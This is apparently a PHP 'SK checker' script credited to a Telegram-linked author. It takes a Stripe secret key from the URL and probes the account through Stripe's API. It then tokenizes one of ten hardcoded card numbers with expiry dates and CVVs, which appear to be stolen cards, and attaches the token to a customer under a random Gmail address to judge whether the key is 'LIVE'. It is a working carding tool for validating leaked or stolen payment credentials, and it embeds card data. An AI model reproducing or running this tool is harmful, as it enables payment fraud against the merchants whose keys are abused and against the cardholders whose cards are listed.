<?php
//Script Author: phccoder https://t.me/PHCC0D3r

/*===[PHP Setup]==============================================*/
error_reporting(0);
ini_set('display_errors', 0);

/*===[Security Setup]=========================================*/
include './config.php';
include './http.php';

/*===[Variable Setup]=========================================*/
$sk = isset($_GET['sk']) ? $_GET['sk'] : '';

/*===[SK Info Validation]=====================================*/
if($sk == ""){
    exit();
}

phc_log('skcheck', 'Checking SK ' . phc_mask_sk($sk));

/*===[Account Diagnostic]=====================================*/
// Read-only check that works even without raw-card access; tells us the
// account state so we can explain the verdict instead of guessing.
$diag = '';
$chargesEnabled = null;
$resp0 = http_request('https://api.stripe.com/v1/account', 'GET', null, $sk . ':');
$curl0 = $resp0['body'];
$res0 = json_decode($curl0, true);
if ($resp0['errno'] || $curl0 === false) {
    phc_log('skcheck', 'Account diagnostic failed errno=' . $resp0['errno'] . ' http=' . $resp0['code']);
} elseif (isset($res0['error'])) {
    phc_log('skcheck', 'Account diagnostic error: ' . (isset($res0['error']['type']) ? $res0['error']['type'] : '') . ' ' . (isset($res0['error']['message']) ? $res0['error']['message'] : ''));
} else {
    $skmode = (strpos($sk, 'sk_test_') === 0) ? 'test' : ((strpos($sk, 'sk_live_') === 0) ? 'live' : 'unknown');
    $diag = ' acct=' . (isset($res0['id']) ? $res0['id'] : '?')
        . ' mode=' . $skmode
        . ' charges_enabled=' . (isset($res0['charges_enabled']) ? ($res0['charges_enabled'] ? '1' : '0') : '?')
        . ' details_submitted=' . (isset($res0['details_submitted']) ? ($res0['details_submitted'] ? '1' : '0') : '?');
    if (isset($res0['requirements']['disabled_reason']) && $res0['requirements']['disabled_reason']) {
        $diag .= ' disabled_reason=' . $res0['requirements']['disabled_reason'];
    }
    phc_log('skcheck', 'Account diagnostic:' . $diag);
    $chargesEnabled = isset($res0['charges_enabled']) ? ($res0['charges_enabled'] ? '1' : '0') : null;
}

/*===[CC Info Randomizer]=====================================*/
$cc_info_arr[] = "4427323412042742|11|2022|778";
$cc_info_arr[] = "4427323412047246|03|2025|056";
$cc_info_arr[] = "4427325078084744|11|2023|720";
$cc_info_arr[] = "4427323412486766|08|2024|555";
$cc_info_arr[] = "4427323412172176|08|2022|776";
$cc_info_arr[] = "4867320147781682|05|2022|237";
$cc_info_arr[] = "4427323412680368|07|2025|788";
$cc_info_arr[] = "4427323412367842|01|2025|124";
$cc_info_arr[] = "4427325012730451|04|2025|227";
$cc_info_arr[] = "4427325662058237|09|2023|708";
$n = rand(0,9);
$cc_info = $cc_info_arr[$n];

/*===[Variable Setup]=========================================*/
$i = explode("|", $cc_info);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");

/*===[cURL Processes]=========================================*/
/* 1st Request (tokens) */
$resp1 = http_request('https://api.stripe.com/v1/tokens', 'POST', "card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv", $sk . ':');
$curl1 = $resp1['body'];
if ($resp1['errno'] || $curl1 === false) {
    phc_log('skcheck', '1st request failed errno=' . $resp1['errno'] . ' http=' . $resp1['code']);
}

/* 1st Request Response */
$res1 = json_decode($curl1, true);

if(isset($res1['id'])){
    /* 2nd Request (customers) */
    $resp2 = http_request('https://api.stripe.com/v1/customers', 'POST', "email=$email&description=phccoder&source=".$res1["id"], $sk . ':');
    $curl2 = $resp2['body'];
    if ($resp2['errno'] || $curl2 === false) {
        phc_log('skcheck', '2nd request failed errno=' . $resp2['errno'] . ' http=' . $resp2['code']);
    }

    /* 2nd Request Response */
    $res2 = json_decode($curl2, true);
    $cus = $res2['id'];
}

/*===[Request Response Setup]=================================*/
if ($resp1['errno'] || $curl1 === false || $curl1 === '') {
    $verdict = "ERROR";
    phc_log('skcheck', 'No usable 1st response (errno=' . $resp1['errno'] . ' http=' . $resp1['code'] . ')');
} elseif(isset($res1['error'])){
    $etype = isset($res1['error']['type']) ? $res1['error']['type'] : '';
    $ecode = isset($res1['error']['code']) ? $res1['error']['code'] : '';
    if ($ecode == 'integration_error' || strpos($curl1, 'You must verify a phone number') !== false) {
        $verdict = "LIMITED";
        phc_log('skcheck', 'SK is LIVE but account restricts raw-card processing (integration_error). Enable Stripe.js / advanced integration or verify your phone.');
    }elseif ($ecode == 'testmode_charges_only') {
        $verdict = "NOT_LIVE";
        phc_log('skcheck', 'SK is valid but account only accepts test-mode charges (testmode_charges_only). Activate live charges in the Stripe Dashboard.');
    }elseif ($etype == 'invalid_request_error' || $etype == 'authentication_error') {
        $verdict = "DEAD";
    }else{
        $verdict = "LIVE";
    }
}else{
    if(isset($res2['error'])){
        $etype2 = isset($res2['error']['type']) ? $res2['error']['type'] : '';
        $ecode2 = isset($res2['error']['code']) ? $res2['error']['code'] : '';
        if ($ecode2 == 'integration_error' || strpos($curl2, 'You must verify a phone number') !== false) {
            $verdict = "LIMITED";
            phc_log('skcheck', 'SK is LIVE but account restricts raw-card processing (integration_error). Enable Stripe.js / advanced integration or verify your phone.');
        }elseif ($ecode2 == 'testmode_charges_only') {
            $verdict = "NOT_LIVE";
            phc_log('skcheck', 'SK is valid but account only accepts test-mode charges (testmode_charges_only). Activate live charges in the Stripe Dashboard.');
        }elseif ($etype2 == "invalid_request_error" || $etype2 == "authentication_error") {
            $verdict = "DEAD";
        }else{
            $verdict = "LIVE";
        }
    }else{
        $verdict = "LIVE";
    }
}

if ($chargesEnabled === '0' && $verdict !== 'ERROR') {
    $verdict = "NOT_LIVE";
    phc_log('skcheck', 'charges_enabled=0: account cannot make live charges - verdict overridden to NOT_LIVE.');
}

echo $verdict;
phc_log('skcheck', 'Verdict: ' . $verdict . $diag . ' | 1st=' . phc_shorten($curl1) . ' | 2nd=' . phc_shorten(isset($curl2) ? $curl2 : 'N/A'));




/*===[PHP Functions]==========================================*/
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@gmail.com';
}
?>
